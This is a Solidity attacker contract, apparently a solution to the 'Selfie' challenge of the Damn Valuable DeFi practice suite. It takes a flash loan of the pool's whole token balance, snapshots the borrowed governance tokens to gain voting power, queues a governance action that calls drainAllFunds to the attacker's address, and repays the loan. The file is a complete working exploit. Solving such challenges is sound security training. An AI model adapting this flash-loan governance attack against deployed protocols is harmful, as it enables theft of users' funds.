// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
import "../selfie/SelfiePool.sol";


interface ISelfiePool {
    function flashLoan(uint256 borrowAmount) external;
    function drainAllFunds(address receiver) external;
}

contract SelfieAttacker {
    DamnValuableTokenSnapshot public token;
    ISelfiePool public immutable pool; 
    SimpleGovernance public immutable governance;
    address payable attackerEAO;
    uint256 public actionId;

    constructor (address tokenAdd, address poolAdd, address governanceAdd, address payable _attackerEAO) {
        token = DamnValuableTokenSnapshot(tokenAdd);
        pool = ISelfiePool(poolAdd);
        governance = SimpleGovernance(governanceAdd);
        attackerEAO = payable(_attackerEAO);
    }

    function attack() external {
        uint256 poolBalance = token.balanceOf(address(pool));
        pool.flashLoan(poolBalance);
    }

    function receiveTokens(address _token, uint256 borrowAmount) public {
        // governance remembers "this" has many tokens (same as governance token)-> can vote...
        token.snapshot();_token;

        // queueAction call _hasEnoughVotes and it checks the balance of governance tokens 
        // then, the action is registered in actions
        bytes memory drainFunds = abi.encodeWithSignature("drainAllFunds(address)", attackerEAO);
        actionId = governance.queueAction(address(pool),drainFunds,0);

        //reimburse the loan
        token.transfer(msg.sender, borrowAmount);
    }

    receive() external payable {} 
}